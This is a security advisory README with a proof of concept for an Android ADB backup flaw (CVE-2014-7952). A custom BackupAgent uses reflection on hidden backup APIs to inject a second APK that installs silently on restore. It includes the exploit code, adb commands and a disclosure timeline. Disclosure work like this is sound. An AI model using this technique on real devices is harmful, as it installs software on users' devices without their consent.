# ADB-Backup-APK-Injection
Android ADB backup APK Injection POC

What is ADB backup/restore?
---------------------------
The Android Operating System offers a backup/restore mechanism of installed packages through the ADB utility.
By default, full backup of applications including the private files stored in /data is performed, but this behaviour can be customized by implementing a BackupAgent (http://developer.android.com/reference/android/app/backup/BackupAgent.html) class. This way applications can feed the backup process with custom files and data.
The backup file created is a simple compressed tar archive with some Android specific headers. Optional encryption is also possible.

APK injection vulnerability
---------------------------
The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned by the applications. While a BackupAgent is being executed during the backup process, it is able to inject additional applications (APKs) into the backup archive without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application.
The Backup Manager can be exploited through simple reflection:

```
	  String packageName = "com.searchlab.wifitest"; // getPackageName();
	  
	  Method backupToTar;
	  Method getData;
		try {
			Class<?> fullbackupClass = Class.forName("android.app.backup.FullBackup");

			Class<?> backupDataOutputClass = Class.forName("android.app.backup.BackupDataOutput");
			
			backupToTar = fullbackupClass.getDeclaredMethod("backupToTar", String.class, String.class, String.class, String.class, String.class, backupDataOutputClass);
			backupToTar.setAccessible(true);		
			
			getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
			getData.setAccessible(true);
			Object backupData = getData.invoke(data);
			
			 
			backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
			backupToTar.invoke(null, packageName, "a", null, getFilesDir().toString(),getFilesDir()+"/com.searchlab.wifitest-1.apk", backupData);
		    
			Log.v("MYBACKUP", "backuptotar invoked!");
			
			/*
			FullBackup.backupToTar(getPackageName(), domain, null, rootpath, filePath, output.getData());
			Class<?> hs = Class.forName("java.util.HashSet");
			m = BackupAgent.class.getDeclaredMethod("fullBackupFileTree", String.class, String.class, String.class, hs, FullBackupDataOutput.class);
	      //m.invoke(d);//exception java.lang.IllegalAccessException
	      m.setAccessible(true);//Abracadabra 
	      m.invoke(this, packageName, "", "/data/tmp/evilApk", null, data);//now its ok
	      */
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
```

Proof of Concept
----------------
In this repository you can find an application along with it's source code which can demonstrate the vulnerabilty.
It was tested on Android 4.4.4 and Android 5.1.1.

Step 1: Install ADB_Backup_Injection.apk (com.searchlab.backupagenttest):
![ADB Backup Injection, custom BackupAgent](/relative/path/to/img.jpg?raw=true "ADB Backup Injection, custom BackupAgent")

This application *does not require any permissions*.

Step 2: Use the following command to create a backup of this package
```
adb backup -f backup.ab -apk com.searchlab.backupagenttest
```

Step 3 (optional): If you want to examine the backup archive just created, use the [ABE](https://github.com/nelenkov/android-backup-extractor) tool:
```
java -jar d:\tools\abe\android-backup-extractor-20140630-bin\abe.jar unpack backup.ab backup.tar
```

In the tar file you will find the injected second application (com.searchlab.wifitest).

Step 4: Use the following command to restore the archive:
```
adb restore backup.ab
```

Step 5: Verify that Wifi Test application was indeed installed:
![ADB Backup Injection, injected Application](/relative/path/to/img.jpg?raw=true "ADB Backup Injection, injected Application")

CVE
---
The ID CVE-2014-7952 was assigned to this vulnerability.

Affected Versions
-----------------
As of today, 2015-07-08, all Android versions are affected, including Android L.

Timeline
--------
SEARCH-LAB Ltd. responsibly reported this threat to the Android security team. At first, Google did not acknowledge the issue being security relevant. Later they kept requesting more time for further investigation, but the bug was still not addressed. The most important milestones of the issue are listed in the next lines:

2014-07-14: The vulnerability was disclosed to the Android security team
2014-07-28: Google refused to treat the issue as a potential threat, but requested to hold off publishing it
2014-10-15: Google answered that it did not get fixed in the L release and kept requesting to hold off publishing it
2015-06-02: Google promised further info in a few days, but it never arrived

